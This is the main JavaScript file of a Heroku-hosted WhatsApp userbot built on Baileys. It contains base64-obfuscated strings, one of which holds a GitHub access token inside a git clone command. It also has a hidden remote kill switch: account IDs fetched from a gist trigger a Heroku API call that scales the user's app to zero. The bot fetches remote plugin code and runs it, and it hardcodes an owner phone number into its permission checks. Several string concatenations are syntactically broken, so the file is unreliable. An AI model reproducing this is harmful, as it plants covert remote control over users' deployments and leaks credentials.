/*
coded by: fusuf
recoded by: abdullah
*/
const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const WhatsAsenaStack = require('whatsdark-npm');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const WhatsAsenaCN = new WAConnection();
    const Session = new StringSession();
    try {
      WhatsAsenaCN.version = [3, 3234, 9]
    } catch {
      console.log(`passed v${WhatsAsenaCN.version}`)
    }
    WhatsAsenaCN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      WhatsAsenaCN.connectOptions.agent = ProxyAgent (config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await WhatsAsenaStack.daily_announcement(config.LANG)
        var ann = await WhatsAsenaStack.ann()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '[ ```Günlük Duyurular``` ]\n\n'
            if (config.LANG == 'AZ') ilan = '[ ```Gündəlik Elanlar``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
            if (config.LANG == 'PT') ilan = '[ ```Anúncios Diários``` ]\n\n,'
            if (config.LANG == 'RU') ilan = '[ ```Ежедневные объявления``` ]\n\n'
            if (config.LANG == 'ML') ilan = '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n'
            if (config.LANG == 'HI') ilan = '[ ```दैनिक घोषणा``` ]\n\n'
            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
            if (config.LANG == 'LK') ilan = '[ ```දෛනික නිවේදන``` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer)})
                } else {
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await WhatsAsenaStack.timezone(WhatsAsenaCN.user.jid)
            var date_bio = await WhatsAsenaStack.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
            await WhatsAsenaCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    WhatsAsenaCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        WhatsAsenaCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        WhatsAsenaCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    WhatsAsenaCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = WhatsAsenaCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    WhatsAsenaCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    WhatsAsenaCN.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login Successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
          try {
              if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                  console.log(plugin.dataValues.name);
                  var response = await got(plugin.dataValues.url);
                  if (response.statusCode == 200) {
                      fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                      require('./plugins/' + plugin.dataValues.name + '.js');
                  }     
              }
          } catch {
              console.log('Some Plugins Are Corrupted: ' + plugin.dataValues.name)
          }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🐺 WhatsAsena' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*Merhaba Abdullah!*\n*WhatsAsenaProjects Bir Chat Bot Olarak Çalışmaktadır🐺*\n*Değiştirmek İçin*\n*.setvar WORK_TYPE:private/public*\n*Komutunu Kullana Bilirsin*\n\n*Eva❤️* ' : '*Merhaba Abdullah!*\n*WhatsAsenaProjects Bir Chat Bot Olarak Çalışmaktadır🐺*\n*Değiştirmek İçin*\n*.setvar WORK_TYPE:private/public*\n*Komutunu Kullana Bilirsin*\n\n*Eva❤️*'
        if (WhatsAsenaCN.user.jid == one || WhatsAsenaCN.user.jid == two || WhatsAsenaCN.user.jid == three || WhatsAsenaCN.user.jid == four || WhatsAsenaCN.user.jid == five || WhatsAsenaCN.user.jid == six || WhatsAsenaCN.user.jid == seven || WhatsAsenaCN.user.jid == eight) {
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.FULLEVA == 'true') {
            var eva_msg = await WhatsAsenaStack.eva_if(config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, eva_msg, MessageType.text)
        }
        else {
            var af_start = await WhatsAsenaStack.work_type(config.WORKTYPE, config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await WhatsAsenaCN.sendMessage(
                WhatsAsenaCN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await WhatsAsenaStack.update(config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, up_ch, MessageType.text)
        }
    })
    WhatsAsenaCN.on('message-new', async msg => {
        
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await WhatsAsenaCN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAsenaCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAsenaCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAsenaCN.user.name), MessageType.text);
                }
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAsenaCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAsenaCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAsenaCN.user.name), MessageType.text);
                }
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT4 == '905511384572-1625319286') {     
            var nsup = config.SUPPORT4.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = WhatsAsenaCN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905510310485,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await WhatsAsenaCN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(WhatsAsenaCN, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(WhatsAsenaCN, msg);
                        } else {
                            whats = new Message(WhatsAsenaCN, msg);
                        }
                        
                        if (msg.key.fromMe && command.deleteCommand && !msg.key.remoteJid.includes('-')) {
                          await whats.delete()                          
                        } 
                        
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                            
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;
                            var error_report = await WhatsAsenaStack.error(config.LANG)
                            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                if (error.message.includes('URL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*'
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*hata* _Only Absolutely URLs Supported_' +
                                        '\n*Çözümü:* _Efendim, Lütfen Medya Araçlarını LOG Numaranda Kullanma._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Hata:* _Databases Err._'
                                        '\n*Nedeni:* _Efendim Database Bozulmuş Durumda._' +
                                        '\n*Çözümü:* _Efendim Database Reset Atmayı Deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Efendim, Grup Adminlerinin Kullanabileceği Komutlar Bazen Split i Okuyamazlar._ ' +
                                        '\n*Çözümü:* _Restart Atmayı Deneyebilirsiniz Efendim._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Heroku Speed Test Yaparken Bir Hata Okudum Efendim._' +
                                        '\n*Çözümü:* _Bir Kez Daha Kullanın Eğer İşe Yaramazsa Restart Atman Yeterli Olur Efendim._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Çözümü:* _Efendim, Lütfen TTS Komutunu Latin Alfabesi İle Kullanın._' +
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Efendim, Yüklediğiniz Pluginde Hata Var._' +
                                        '\n*Çözümü:* _Efendim, Plugindeki Kodları Düzeltmeyi Deneyebilirsiniz Yada Plugini Silin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Efendim, Herokuya Erişemedim._' +
                                        '\n*Çözümü:* _Efendim, Biraz Bekleyip Deneyin Olmaz İse Restart Atmayı Veya İşleminizi İnternet Sitesi Üzerinden Gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _Efendim, Lütfen İMG ve Wiki Komutlarını Kullanmayınız_' +
                                        '\n*Çözümü:* _Efendim, Çözümü Olmayan Ve Önemsiz Olan Bir Hatadır._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' +
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _Efendim, Lütfen İMG ve Wiki Komutlarını Kullanmayınız_' +
                                        '\n*Çözümü:* _Efendim, Çözümü Olmayan Ve Önemsiz Olan Bir Hatadır._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Efendim, Nedenini Çözemedim Üzerinde Çalışıyorum._' +
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Efendim, Lütfen Plugin İ Doğru Kullanın._' +
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Çözümü:* _Efendim, Lütfen Silmek istediğin Pluginin İsmini Doğru Yazdığınızdan ve Böyle Bir Pluginin Yüklü Olduğundan Emin Ol._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*🙇🏻 Efemdim, Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' +
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await WhatsAsenaCN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            WhatsAsenaCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await WhatsAsenaCN.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
